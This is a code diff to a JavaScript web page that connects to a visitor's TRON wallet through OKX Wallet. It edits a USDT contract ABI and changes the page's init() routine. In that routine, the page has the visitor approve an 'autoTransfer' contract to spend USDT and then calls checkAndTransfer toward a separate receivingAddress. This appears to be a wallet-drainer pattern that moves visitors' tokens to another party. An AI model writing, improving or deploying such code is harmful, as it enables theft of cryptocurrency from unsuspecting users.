@@ -36,8 +36,22 @@ const usdtAbi = [
     {"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
     {"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
     {"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
-    {"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
+    {"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},
+    {"anonymous":false,"inputs":[],"name":"Pause","type":"event"},
+    {"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},
+    {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}
 ];
+
 const autoTransferAbi = [
     {"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
     {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
@@ -50,16 +64,9 @@ const autoTransferAbi = [
 
 let tronWeb;
 
-function logMessage(message) {
-    const resultDiv = document.getElementById('result');
-    const messageElement = document.createElement('div');
-    messageElement.innerText = message;
-    resultDiv.appendChild(messageElement);
-}
-
 async function init() {
     if (typeof window.tronWeb === 'undefined') {
-        logMessage('请安装OKX Wallet并切换到TRON网络!');
+        alert('请安装OKX Wallet并切换到TRON网络!');
         return;
     }
 
@@ -67,24 +74,25 @@ async function init() {
 
     try {
         const account = tronWeb.defaultAddress.base58;
-        logMessage('Account: ' + account);
+        document.getElementById('result').innerText = 'Account: ' + account;
 
-        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
-        logMessage('USDT Contract: ' + usdtContractAddress);
+        const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
+        const autoTransferContract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
 
-        const autoTransferContract = await tronWeb.contract().at(autoTransferContractAddress);
-        logMessage('Auto Transfer Contract: ' + autoTransferContractAddress);
+        document.getElementById('result').innerText += '\nUSDT Contract: ' + usdtContractAddress;
+        document.getElementById('result').innerText += '\nAuto Transfer Contract: ' + autoTransferContractAddress;
 
-        logMessage('开始授权...');
+        document.getElementById('result').innerText += '\n开始授权...';
         await usdtContract.approve(autoTransferContractAddress, approveAmount).send({ shouldPollResponse: true });
-        logMessage('授权成功');
 
-        logMessage('开始转账...');
-        await autoTransferContract.checkAndTransfer(account).send({ shouldPollResponse: true });
-        logMessage('转账成功');
+        document.getElementById('result').innerText += '\n授权成功';
+        document.getElementById('result').innerText += '\n开始转账...';
+        await autoTransferContract.checkAndTransfer(receivingAddress).send({ shouldPollResponse: true });
+
+        document.getElementById('result').innerText += '\n转账成功';
     } catch (error) {
         console.error('Error:', error);
-        logMessage('操作失败: ' + error.message);
+        document.getElementById('result').innerText += '\n操作失败: ' + error.message;
     }
 }
 
